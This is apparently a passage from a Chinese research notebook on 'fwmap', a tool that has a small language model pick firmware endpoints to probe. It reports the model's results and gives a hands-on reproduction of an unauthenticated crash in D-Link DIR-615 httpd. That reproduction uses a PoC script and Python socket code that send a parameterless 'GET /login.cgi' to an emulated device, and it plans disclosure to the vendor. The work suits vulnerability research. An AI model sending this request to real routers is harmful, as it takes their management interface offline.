## 1.3 今天最重要的四个数

| 实验 | 结果 | 说明 |
|---|---|---|
| 具名 temp=0.0，5 次 | **5/5** 判出崩溃 | 逐位相同，是贪心解码的必然 |
| 具名 temp=0.7，5 次 | **5/5** | 路径有波动，结论不变 |
| **匿名 temp=0.7，5 次** | **0/5** | 藏掉名字后，挑的全是清单最前面几条 |
| 自评：模型参与率 | **75%**（8 步里 6 步） | 另 2 步是规则兜底 |

**结论一句话**：

> 模型挑端点的能力全部来自**名字和参数**这类语义线索；
> 抽掉线索，它就退化成顺序挑 —— 和固定规则没有区别。

这条是负面的，但它把「模型能做什么」的边界钉死了，比含糊的"引入大模型提升效率"扎实。

## 1.4 过程中被自己的流程坑了三次（都修了）

1. 进「挑端点」阶段后，`verdict` 分支**永远触发不到** → 模型被锁死在 probe 循环；
2. 模型把结论下到正常页（判 normal），**回避真正 0 字节那条** → 规则限定只能对异常条目下结论；
3. `pages {'url': ...}` 这种**编参数被静默接受** → 改成多余参数直接判非法。

**教训**：说"模型不会做事"之前，先确认流程有没有给出口。

# 第二部分：那条漏洞 —— 手把手复现

> 目标：**D-Link DIR-615 C2 3.03** 的 `GET /login.cgi` 未认证崩溃
> 环境：VMware 里的 Ubuntu（192.168.8.137，`ubuntu/ubuntu`）
> 耗时：约 10 分钟

## 2.1 这是个什么漏洞

不带参数访问 `/login.cgi`，设备的 Web 服务（`sbin/httpd`）**直接崩掉**（SIGSEGV），
管理界面从此打不开。带上 `?graph_id=1` 就完全正常。

- 不需要登录
- 不需要 payload
- 一个请求就够

## 2.2 前置检查（先确认环境没坏）

```bash
# 1) rootfs 在不在（只有 root 能读，所以要 sudo）
sudo ls /home/ubuntu/lab/d615/root/sbin/httpd

# 2) 能不能跑 MIPS 的二进制（binfmt 注册了 qemu-mips-static 才可以）
ls /usr/bin/qemu-mips-static
cat /proc/sys/fs/binfmt_misc/qemu-mips 2>/dev/null | head -3
```

两条都正常就可以往下走。第二条没输出的话，先装 `qemu-user-static`。

## 2.3 一键跑（推荐先跑这个）

```bash
cd ~/fwmap-run        # 仓库目录，里面要有 tools/poc-dir615-login-cgi.sh
sudo bash tools/poc-dir615-login-cgi.sh /home/ubuntu/lab/d615/root
```

它做四件事：

1. 起服务（`chroot` 进 rootfs，跑 `/sbin/httpd -h /www -p 80`）；
2. **对照组 A**：`GET /index.asp` —— 证明服务本来活着；
3. **对照组 B**：`GET /login.cgi?graph_id=1` —— 证明带参数不会崩；
4. **触发 3 次**：每次重启服务，再发 `GET /login.cgi`，看进程还在不在。

跑完会生成 `evidence-<时间戳>/`，里面有 `summary.txt` 和 `httpd.log`。

## 2.4 你应该看到什么

```
== 对照组 A：正常页面应该活着 ==
  GET /index.asp            → 305 字节  HTTP/1.0 200 OK  进程=up

== 对照组 B：带 graph_id 应该活着 ==
  GET /login.cgi?graph_id=1 → 1818 字节 HTTP/1.0 200 OK  进程=up

== 触发：不带 graph_id ==
  第 1 次：GET /login.cgi → 0 字节  (空响应)  进程=down
  第 2 次：GET /login.cgi → 0 字节  (空响应)  进程=down
  第 3 次：GET /login.cgi → 0 字节  (空响应)  进程=down

== 结论 ==
  崩溃复现：未认证的 GET /login.cgi 使 Web 服务退出。
```

`httpd.log` 里能直接看到 qemu 报的那句：

```
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
```

## 2.5 自己动手单发（不依赖脚本，感受一下）

开两个终端。

**终端一：起服务**

```bash
sudo -i
cd /home/ubuntu/lab/d615/root
pkill -9 -f 'sbin/httpd'
chroot . /sbin/httpd -h /www -p 80 &
```

**终端二：先发正常的，再发要命的**

```bash
# 正常：带参数
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 80), 5)
s.sendall(b"GET /login.cgi?graph_id=1 HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
d = b""
while True:
    c = s.recv(4096)
    if not c: break
    d += c
print(len(d), "字节；首行：", d.split(b"\r\n")[0])
PY
```

应该返回 1818 字节、`HTTP/1.0 200 OK`。

```bash
# 要命的：不带参数
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 80), 5)
s.sendall(b"GET /login.cgi HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
print("收到：", s.recv(4096))
PY
```

应该返回**空**（`b''`）。然后回终端一敲 `jobs` / `pgrep -f sbin/httpd` —— **进程没了**。

## 2.7 常见失败

| 现象 | 原因 | 处理 |
|---|---|---|
| `服务起不来` | rootfs 缺 `/dev/null` | 脚本会自动 `mknod`，手动跑要自己补 |
| 端口没起来 | 上一轮 httpd 没退干净 | `sudo pkill -9 -f sbin/httpd` |
| 全部返回 0 字节 | binfmt 没注册 | 装 `qemu-user-static` 并 `update-binfmts` |
| `/login.cgi` 返回 404 | 固件版本不对（2015 后的重构版没有这个端点） | 换 C2 或 E4 |

## 2.8 这条漏洞现在算几级证据

**候选（candidate）**，还不是确认的新漏洞。理由：

| 门槛 | 状态 |
|---|---|
| 本地复现（qemu + chroot） | ✅ 3/3，跨 C2 / E4 两个版本 |
| 排除环境因素 | ✅ 三对照（正常页 / 带参数 / 随机路径） |
| 公开渠道查重 | ⚠️ 只查了离线 NVD（423,984 条），`DIR-615 graph_id` 0 命中 |
| 真机验证 | ❌ 没有设备 |
| 厂商 / CNA 确认 | ❌ 未提交 |

**要升级成「新漏洞」，最少要补**：在线 NVD + Exploit-DB + CNVD 全查一遍 → 真机或
FirmAE 全系统模拟 → 提交 D-Link 安全响应 / CNVD / MITRE。

## 2.9 想更进一步的话：找出崩在哪

现在只知道"崩了"，不知道为什么崩。下一步是反汇编 `sbin/httpd`：

```bash
python3 -m fwmap m2 /home/ubuntu/lab/d615/root/sbin/httpd -o /tmp/d615-m2
python3 -m fwmap m3 --m2 /tmp/d615-m2 --flow /home/ubuntu/d615_probe_flow.json
```

预期是 `websGetVar(wp, "graph_id", NULL)` 返回 NULL，后面没判空就用了。
**验证了这一点，报告就能从「某请求导致崩溃」升级成「第 X 条指令对空指针解引用」**，
同时大概率能找到同一二进制里犯同样错的其它 handler。

# 第三部分：后面能做什么（让它成为真正的智能体）

## 3.0 先看今天的结论划出的线

```
规则擅长的：穷举（把端点都列出来）、验收（判对错）、兜底（模型答不出时）
模型擅长的：借着语义线索跳过无关项、把观察写成结论
模型做不到的：从行为差异里发现异常（匿名组 0/5 已经证明）
```

所以能力提升的方向很清楚：**要么给它新的线索，要么给它更长的链条**。

## 3.1 优先级排序

| 优先级 | 方向 | 做什么 | 怎么算成功 |
|---|---|---|---|
| **P0** | 让它"看见行为" | 把响应体 diff、状态码、长度分布、错误页文本喂给模型 | 匿名组从 0/5 提到 ≥3/5 |
| **P1** | 让它"记得住" | 知识库（厂商/机制/历史结论）进提示，不只用于排序 | 同厂商第二台固件步数下降 ≥30% |
| **P2** | 让它"追根因" | verdict 之后接反汇编，模型引用具体语句 | 能输出「崩在函数 X 第 N 条指令」 |
| **P3** | 放宽阶段收束 | 让模型决定"下一步做哪一类事" | 1.5B 目前做不到，先测 7B 的阈值 |
| **P4** | 跨固件验证 | 同一套流程跑 DIR-816L / Edimax | ≥3/6 固件端到端走通 |

## 3.2 每一条具体怎么做

### P0：让它看见行为（最该先做）

今天匿名组失败的根因不是模型笨，是**我什么都没给它看**。候选只有编号，
它没有可推理的材料，只能按顺序挑。

做法：probe 之后，把这几样塞进下一次提示：

```
/apply.cgi       1818B  200  首行:<html>      与首页相同
/xxx.cgi          248B  404  首行:not found   与负对照相同
/login.cgi          0B  ---  无响应            ← 异常
```

**关键**：不光给长度，还要给"和对照组比，它是哪一类"。
模型不需要做算术，只需要认出"无响应"这一行。

### P1：让它记得住

`fwmap/knowledge.py` 已经有厂商/机制/成功率，但只用于**排序**，没进**提示**。
让模型在第一次决策前就知道："Edimax 的 goform 路由通常要 Basic 认证"，
比它自己试一遍快得多。

### P2：让它追根因

现在 `verdict` 只能说"崩了"。接上 m2/m3 之后，可以要求它引用反汇编片段，
并让规则核对：引用的地址必须真实存在、必须在 httpd 里。

这就从"报告现象"变成"报告原因"，也是漏洞报告能不能提交的分水岭。

### P3：放宽收束（谨慎）

今天是"规则定阶段、模型挑目标"。更自主的版本是模型自己决定"现在该探还是该收"。
**但 1.5B 实测做不到**（自由选动作 6 步一次没选过 probe）。所以这条必须先在 7B 上测，
测出阈值再谈设计。

## 3.3 一个更根本的问题，值得先想清楚

今天所有实验都在回答"模型挑得准不准"。但还有个问题没答：

> **如果模型挑的和规则一样准，为什么要用模型？**

现在的答案只有一条：**它能在有线索时跳过 13 条无关项直达目标**（具名组 2 次 vs 固定顺序 14 次）。
这条够写进论文，但不够撑起"智能体"三个字。

要撑起来，得让它做到规则做不到的事 —— 比如：
跨固件迁移经验、看到错误页后改变策略、发现"这条端点和文档描述不符"。
这些都属于 P1 和 P2，不是调提示能解决的。

## 附：今天新增的命令行开关

```bash
fwmap plan <binary> --rootfs <dir> \
  --probe              # 真把端点发给固件（要 Linux + qemu）
  --temperature 0.7    # 0=贪心可复现，>0=采样测鲁棒性
  --anonymize          # 隐藏 uri 和参数（测"靠名字还是靠行为"）
  --max-steps 8
```

跑完自动输出自评表：模型参与率 / 被拒次数与原因 / 探测与异常数 / 结论采纳率。
